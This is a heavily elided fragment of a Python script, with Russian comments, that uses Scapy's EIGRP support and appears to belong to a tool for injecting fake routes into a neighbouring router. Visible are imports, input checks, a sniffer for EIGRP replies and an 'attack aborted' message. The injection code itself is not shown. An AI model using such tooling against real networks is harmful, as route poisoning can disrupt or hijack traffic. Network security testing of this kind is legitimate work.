...
from scapy.contrib.eigrp import EIGRP, EIGRPParam, EIGRPIntRoute, EIGRPExtRoute, EIGRPSwVer, EIGRPAuthData
    ...
    try:
        ...
        if len(networks) != len(prefixes) or len(networks) != len(next_hops):
            ...
            def receive_eigrp_reply():
                ...
                sniffer = AsyncSniffer(filter="ip proto 88", iface=interface, prn=lambda x: None, stop_filter=is_eigrp_reply, store=False, timeout=10)  # Захватываем EIGRP Reply в ответ на EIGRP Query
                sniffer.start()
            ...
            if eigrp_reply_captured == False:  # Если не было захвачено ни одного EIGRP Reply (т.е. маршруты не приняты)
                print(Fore.RED + f"    [-] %ERROR: Fake routes were not accepted by the neighboring router (attack aborted)")  # Переведено
